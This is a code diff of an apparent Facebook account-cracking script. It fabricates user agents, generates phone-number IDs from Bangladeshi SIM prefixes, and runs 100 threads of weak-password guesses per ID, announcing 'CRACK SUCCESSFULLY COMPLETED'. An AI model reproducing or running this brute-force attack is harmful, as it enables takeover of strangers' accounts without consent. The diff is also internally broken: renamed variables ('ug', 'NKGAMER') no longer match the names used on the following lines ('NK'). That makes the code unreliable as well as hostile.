@@ -33,7 +33,7 @@ for tg in range(5000):
 	f=random.randrange(3000,6000)
 	g=random.randrange(20,100)
 	h='Mobile Safari/537.36'
-	NK=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
 	ugen.append(NK)
 for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
@@ -106,7 +106,7 @@ def fuck():
     os.system('clear')
    # os.system('xdg-open https://www.facebook.com/profile.php?id=100069938063027')
     print(logo)
-    print('[+] SIM CODE BD=> 016•017•018•019-013')
+    print('[+] SIM CODE BD=> 016•017•018•019')
     nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     nudex = ''.join(random.choice(string.digits) for _ in range(2))
     nud = ''.join(random.choice(string.digits) for _ in range(2))
@@ -115,7 +115,7 @@ def fuck():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=100) as NK-GAMER:
+    with ThreadPool(max_workers=100) as NKGAMER:
         os.system('clear')
         print(logo)
         #os.system('xdg-open https://www.facebook.com/profile.php?id=100069938063027')
@@ -128,7 +128,7 @@ def fuck():
         for guru in user:
             uid = nude+nudex+nud+guru
             pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
-            NK-GAMER.submit(rcrack,uid,pwx,tl)
+            NK.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
